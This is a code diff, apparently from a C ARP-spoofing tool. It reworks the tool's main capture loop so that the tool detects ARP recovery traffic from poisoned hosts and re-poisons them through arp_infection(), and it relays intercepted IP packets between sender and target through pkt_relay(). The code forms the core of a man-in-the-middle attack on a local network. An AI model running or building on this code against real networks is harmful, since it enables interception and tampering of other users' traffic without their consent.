@@ -65,7 +65,7 @@ int main(int argc, char* argv[])
 	for(int i = 0; i < sess_cnt; i++) 
 		arp_infection(sess[i]);
 
-	// ip packet relay & recovery detection
+	// arp recovery detection & ip packet relay
 	while (true) 
 	{
 		int res = pcap_next_ex(handle, &header, &recv_pkt);
@@ -73,6 +73,35 @@ int main(int argc, char* argv[])
 		if (res == -1 || res == -2) break;
 		ether_header *ethhdr = (ether_header*)recv_pkt;
 		
+		if(ethhdr->ether_type == htons(ETHERTYPE_ARP)) // if arp_pkt
+		{
+			arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));
+			for(int i = 0; i < sess_cnt; i++)
+			{
+				if(!memcmp(ethhdr->src_mac, ip2mac[sess[i].send_ip], ADDR_LEN_MAC) &&
+				   !memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].tar_ip, ADDR_LEN_IP) || // if src_mac == s.send_mac && tar_ip == s.tar_ip
+				   !memcmp(ethhdr->src_mac, ip2mac[sess[i].tar_ip], ADDR_LEN_MAC) &&
+				   !memcmp(ethhdr->dst_mac, mac_ff, ADDR_LEN_MAC) &&
+				   !memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].send_ip, ADDR_LEN_IP))  // if src_mac == s.tar_mac && broadcast && tar_ip == s.send_ip
+				{
+					arp_infection(sess[i]);
+				}
+			}
+		}
+		else if(ethhdr->ether_type == htons(ETHERTYPE_IP)) // if ip_pkt
+		{
+			for(int i = 0; i < sess_cnt; i++)
+			{
+				if(!memcmp(ethhdr->src_mac, ip2mac[sess[i].send_ip], ADDR_LEN_MAC) &&
+				    memcmp(recv_pkt + DST_IP_POS, my_ip, ADDR_LEN_IP)) // if src_mac == s.send_mac && dst_ip != my_ip
+				{
+					pkt_relay(recv_pkt, header->caplen, sess[i]);
+					break;
+				}
+			}
+		}
+	
+/*
 		for(int i = 0; i < sess_cnt; i++)
 		{
 			if(!memcmp(ip2mac[sess[i].send_ip], ethhdr->src_mac, ADDR_LEN_MAC))
@@ -90,10 +119,10 @@ int main(int argc, char* argv[])
 					if((arphdr->op == htons(ARP_REQUEST)) && 
 					   (!memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].tar_ip, ADDR_LEN_IP)))
 							arp_infection(sess[i]);
-				}
-						
+				}	
 				break;
 			}
 		}
+*/
 	}
 }
